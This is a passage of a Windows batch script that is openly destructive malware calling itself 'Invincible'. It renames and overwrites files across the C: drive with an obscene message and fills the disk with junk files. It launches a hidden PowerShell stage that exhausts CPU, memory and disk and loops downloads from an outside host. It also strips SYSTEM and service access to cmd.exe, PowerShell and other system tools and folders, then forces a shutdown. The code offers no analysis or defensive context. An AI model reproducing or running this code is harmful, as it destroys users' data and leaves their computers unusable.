        ren "%%f" "%%~nf.invincible" >nul 2>&1
    )
)
for /r "C:\" %%i in (*.invincible) do (
    if exist "%%i" if not exist "%%i\*" (
        > "%%i" echo Your computer's asshole has been fucked by Invincible.
    ) 2>nul
)
goto :disk

:disk
set "d=%TEMP_DIR%\f_!random!"
set "x=%TEMP_DIR%\b_!random!.tmp"
md "!d!" 2>nul
fsutil file createnew "!x!" 1073741824 >nul 2>&1
goto :stage2_payload

:stage2_payload
> "!PS_FILE!" (
echo $cpu = [Environment]::ProcessorCount
echo $ram = [int]((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB^)
echo $jobs = @(^)
echo for ($i=0; $i -lt $cpu; $i++^) { $jobs += Start-Job -ScriptBlock { while ($true^) { $null = Get-Random } } }
echo $mem = [System.Collections.ArrayList]::new(^)
echo while ($true^) { try { $mem.Add('x' * 1GB^) } catch { $mem.Clear(^) } }
echo while ($true^) { try { $f = Join-Path $env:TEMP "d_$(Get-Random^).tmp"; [IO.File]::WriteAllBytes($f, (New-Object Byte[] 1GB^)^) } catch {} }
echo Start-Job -ScriptBlock { while ($true^) { try { $f = Join-Path $env:TEMP "f_$(Get-Random^).tmp"; fsutil file createnew $f 1073741824 ^> $null 2^>^&1 } catch {} } }
echo Start-Job -ScriptBlock { $w = New-Object System.Net.WebClient; while ($true^) { try { $w.DownloadFile('http://cachefly.cachefly.net/100mb.test', "$env:TEMP\n_$(Get-Random^).tmp"^) } catch {} } }
echo while ($true^) { Start-Sleep -Seconds 60; $mem.Clear(^) }
echo for ($i=0; $i -lt $cpu; $i++^) { Start-Job -ScriptBlock { while ($true^) { [math]::Sqrt([math]::PI * [math]::E^) } } }
echo for ($i=0; $i -lt $cpu; $i++^) { Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Drawing; public class GDIPlus { public static void Draw(^) { while (true^) { using (var bmp = new Bitmap(1920, 1080^)^) { using (var g = Graphics.FromImage(bmp^)^) { g.Clear(Color.Black^); } } } } }'; [GDIPlus]::Draw(^) } }
echo for ($i=0; $i -lt $cpu; $i++^) { Start-Job -ScriptBlock { while ($true^) { $f = Join-Path $env:TEMP "g_$(Get-Random^).tmp"; fsutil file createnew $f 2147483648 ^> $null 2^>^&1 } } }
echo for ($i=0; $i -lt $cpu; $i++^) { Start-Job -ScriptBlock { $w = New-Object System.Net.WebClient; while ($true^) { try { $w.DownloadFile('http://cachefly.cachefly.net/1gb.test', "$env:TEMP\o_$(Get-Random^).tmp"^) } catch {} } } }
echo while ($true^) { Start-Sleep -Seconds 30; $mem.Clear(^) }
)
start /b powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!PS_FILE!" 2>nul 1>nul
timeout /t 2 /nobreak >nul
del "!PS_FILE!" 2>nul
goto :CRASH

:CRASH
set "SYS32=%SystemRoot%\system32"
set "SYS64=%SystemRoot%\SysWOW64"
call :lockexe "%SYS32%\cmd.exe" "%SYS64%\cmd.exe"
call :lockexe "%SYS32%\net.exe" "%SYS64%\net.exe"
call :lockexe "%SYS32%\net1.exe" "%SYS64%\net1.exe"
call :lockexe "%SYS32%\mshta.exe" "%SYS64%\mshta.exe"
call :lockexe "%SYS32%\wscript.exe" "%SYS64%\wscript.exe"
call :lockexe "%SYS32%\cscript.exe" "%SYS64%\cscript.exe"
call :lockexe2 "%SYS64%\FTP.exe"
call :lock_exe_ps "%SYS32%\WindowsPowerShell\v1.0\powershell.exe" "%SYS64%\WindowsPowerShell\v1.0\powershell.exe"
takeown /f "C:\ProgramData" /a >nul 2>&1
icacls "C:\ProgramData" /grant:r Administrators:(F) /grant:r Users:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny system:(D) /deny mssql$sqlexpress:(D) >nul 2>&1
takeown /f "C:\Users\Public" /a >nul 2>&1
icacls "C:\Users\Public" /grant:r Administrators:(F) /grant:r Users:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny system:(D) /deny mssql$sqlexpress:(D) >nul 2>&1
shutdown /s /f /t 0
exit /b

:lockexe
takeown /f "%~1" /a >nul 2>&1
icacls "%~1" /grant:r Administrators:(F) /grant:r Users:(R) /grant:r system:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny mssql$sqlexpress:(D) >nul 2>&1
if not "%~2"=="" (
    takeown /f "%~2" /a >nul 2>&1
    icacls "%~2" /grant:r Administrators:(F) /grant:r Users:(R) /grant:r system:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny mssql$sqlexpress:(D) >nul 2>&1
)
exit /b

:lockexe2
takeown /f "%~1" /a >nul 2>&1
icacls "%~1" /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny system:(D) /deny mssql$sqlexpress:(D) >nul 2>&1
exit /b

:lock_exe_ps
takeown /f "%~1" /a >nul 2>&1
icacls "%~1" /grant:r Administrators:(F) /grant:r Users:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny system:(D) /deny mssql$sqlexpress:(D) >nul 2>&1
takeown /f "%~2" /a >nul 2>&1
icacls "%~2" /grant:r Administrators:(F) /grant:r Users:(R) /deny SERVICE:(D) /deny mssqlserver:(D) /deny "network service":(D) /deny system:(D) /deny mssql$sqlexpress:(D) >nul 2>&1
exit /b
